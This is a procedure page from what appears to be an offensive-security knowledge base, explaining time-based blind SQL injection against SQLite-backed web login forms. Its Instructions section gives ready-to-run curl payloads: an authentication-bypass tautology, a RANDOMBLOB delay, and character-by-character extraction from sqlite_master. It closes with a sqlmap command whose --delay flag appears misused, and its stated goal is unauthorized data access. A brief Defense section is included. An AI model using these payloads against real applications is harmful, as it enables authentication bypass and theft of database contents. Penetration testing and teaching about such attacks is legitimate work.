---
id: 00233855-3a10-4887-afc0-0fec053765ff
name: Time-Based-Blind-SQL-Injection-in-SQLite
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:37.134618+00:00'
updated_at: '2023-04-10T20:24:30.842465+00:00'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - '[[tags/SQLite Injection]]'
  - '[[tags/Time based]]'
  - sqli
  - blind
  - time-based
commands:
  - '[[commands/curl-inject-sqlite-time-payload]]'
tools:
  - '[[tools/sqlmap]]'
  - '[[tools/Burp-Suite]]'
platforms:
  - Web
validated: true
---

# Time-Based-Blind-SQL-Injection-in-SQLite

## Summary

This procedure outlines how to perform time-based blind SQL injection against web applications using SQLite databases. By injecting payloads that introduce conditional delays through randomized string matching and resource-intensive operations like generating large random blobs, attackers can infer database content without direct output, such as extracting table names, column data, or user credentials bit by bit based on response times.

## Description

Time-based blind SQL injection exploits vulnerabilities in web applications where user input is concatenated into SQL queries without proper sanitization. In SQLite, which lacks a native sleep function, delays are achieved using functions like RANDOMBLOB to generate large random byte strings, causing computational overhead. The technique involves crafting payloads where a condition (e.g., checking if a character matches) triggers the delay only if true, allowing inference of data by measuring response times. This is particularly useful in blind scenarios where error messages or data dumps are not visible. The procedure targets login forms, search fields, or URL parameters in PHP/Python web apps using SQLite. Prerequisites include identifying a vulnerable injection point and tools for timing requests. Success enables data exfiltration, such as database schema or sensitive records, mapping to MITRE ATT&CK technique T1190 (Exploit Public-Facing Application).

## Requirements

1. Access to a vulnerable web application endpoint (e.g., login or search form) that uses SQLite and is susceptible to SQL injection.
2. Knowledge of the injection point (e.g., username field in a POST request) and basic SQL syntax.
3. Tools for sending HTTP requests with timing analysis, such as curl, Burp Suite, or sqlmap, and a way to measure response times (e.g., browser dev tools or scripting).
4. Network access to the target application without WAF blocking delays.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation, sanitization, and use of parameterized queries or prepared statements to prevent injection.
- Employ web application firewalls (WAFs) that detect anomalous response times or SQL keywords in payloads.
- Enable database logging and monitor for unusual query patterns or long-running queries caused by resource-intensive functions like RANDOMBLOB.
- Use least-privilege database accounts and regular security audits with tools like sqlmap for vulnerability scanning.

## Objectives

1. Confirm the presence of a time-based blind SQL injection vulnerability in a SQLite-backed web application.
2. Extract database information, such as version, table names, or data values, by inferring boolean conditions through response delays.
3. Achieve unauthorized data access or escalation in the application context.

## Instructions

### Step 1: Identify and Confirm Injection Point

**Context**: Locate a parameter vulnerable to SQL injection and test for basic SQLi to ensure the app uses SQLite and responds to injections.

Use [[tools/Burp-Suite]] or a browser to intercept requests and modify parameters (e.g., append ' OR 1=1 -- to a username field). Check for logical errors or delays indicating injection success. If using curl, test with a simple payload.

**Command** ([[commands/curl-inject-sqlite-time-payload]]):
```bash
curl -X POST -d "username=admin' OR 1=1 --" -w "%{time_total}" http://target.com/login
```

> This sends a tautology payload to bypass authentication or alter query logic. Measure the total time with -w flag. Expected: Faster response if injection works (e.g., login success or error change). If SQLite-specific errors appear (e.g., syntax near unexpected token), confirm the backend.

### Step 2: Test Basic Time Delay

**Context**: Verify time-based blind SQLi by injecting a payload that always causes a delay, establishing a baseline response time (e.g., 5 seconds vs. normal 0.5 seconds).

Craft a payload using SQLite's RANDOMBLOB to generate a large random blob for delay. Replace [SLEEPTIME] with a value like 5000 for 5 seconds approximate delay (adjust based on server performance; RANDOMBLOB(5000000) roughly delays ~5s).

Embed the [[codes/SQLite-Randomized-String-Matching-Delay-Payload]] code into the injection point.

**Command** ([[commands/curl-inject-sqlite-time-payload]]):
```bash
curl -X POST -d "username=admin' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5000000)))) --" -w "%{time_total}" http://target.com/login
```

> Replace the payload with the code snippet, substituting [RANDNUM] with 1 and [SLEEPTIME] with 5000 (adjust for ms equivalent via blob size). Expected: Response time significantly longer (e.g., >4s) compared to non-injected request, confirming delay capability.

### Step 3: Extract Data Using Conditional Delays

**Context**: Use boolean conditions tied to database queries for inference. For example, to extract the first character of a table name, test if it equals 'A' by delaying only if true, iterating through alphabet and positions.

Build on the payload: AND (SELECT SUBSTR(table_name,1,1) FROM sqlite_master WHERE type='table')='A' then delay else no. Use the randomized matching for obfuscation to evade simple filters.

**Command** ([[commands/curl-inject-sqlite-time-payload]]):
```bash
curl -X POST -d "username=admin' AND (SELECT SUBSTR(sqlite_master.name,1,1) FROM sqlite_master WHERE type='table') LIKE 'A' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5000000)))) --" -w "%{time_total}" http://target.com/login
```

> Iterate: Send payloads for each letter (A-Z), position (1-N). If response > threshold (e.g., 4s), condition true. Use scripting to automate. Expected: Delayed responses reveal matching characters, allowing reconstruction of data like 'users' table name.

### Step 4: Automate with Tool

**Context**: For efficiency, use sqlmap to automate time-based extraction, specifying SQLite and delay thresholds.

Leverage [[tools/sqlmap]] for blind time-based attacks.

**Command** ([[commands/curl-inject-sqlite-time-payload]]):
```bash
sqlmap -u "http://target.com/login" --data="username=admin&password=pass" --dbms=sqlite --technique=T --delay=5 --level=3 --risk=2
```

> Note: This is a conceptual sqlmap invocation; adapt to exact endpoint. Expected: sqlmap outputs inferred data like DB version, tables, and columns based on timing.
